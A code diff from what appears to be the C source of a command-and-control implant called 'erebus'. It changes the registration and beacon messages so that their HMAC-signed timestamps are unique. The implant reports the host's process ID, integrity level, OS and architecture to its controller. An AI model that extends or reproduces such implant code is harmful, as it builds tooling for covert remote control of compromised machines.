@@ -24,6 +24,7 @@ typedef struct erebus_state {
     erebus_transport *transport;
     erebus_task_result pending[EREBUS_MAX_PENDING];
     size_t            pending_count;
+    int64_t           last_beacon_ts;
 } erebus_state;
 
 static int erebus_register(erebus_state *st) {
@@ -34,7 +35,7 @@ static int erebus_register(erebus_state *st) {
         &msg.pid, msg.integrity_level, sizeof(msg.integrity_level));
     strncpy(msg.os, erebus_os_name(), sizeof(msg.os) - 1);
     strncpy(msg.arch, erebus_arch_name(), sizeof(msg.arch) - 1);
-    msg.timestamp = erebus_unix_ms();
+    msg.timestamp = erebus_unique_unix_ms(&st->last_beacon_ts);
     if (!erebus_hmac_sha256(st->secret, st->secret_len,
             (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
         return 0;
@@ -78,7 +79,7 @@ static erebus_beacon_resp *erebus_send_beacon(erebus_state *st) {
     memset(&msg, 0, sizeof(msg));
     strncpy(msg.implant_id, EREBUS_IMPLANT_ID, sizeof(msg.implant_id) - 1);
     strncpy(msg.session_id, st->session_id, sizeof(msg.session_id) - 1);
-    msg.timestamp = erebus_unix_ms();
+    msg.timestamp = erebus_unique_unix_ms(&st->last_beacon_ts);
     if (!erebus_hmac_sha256(st->secret, st->secret_len,
             (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
         return NULL;
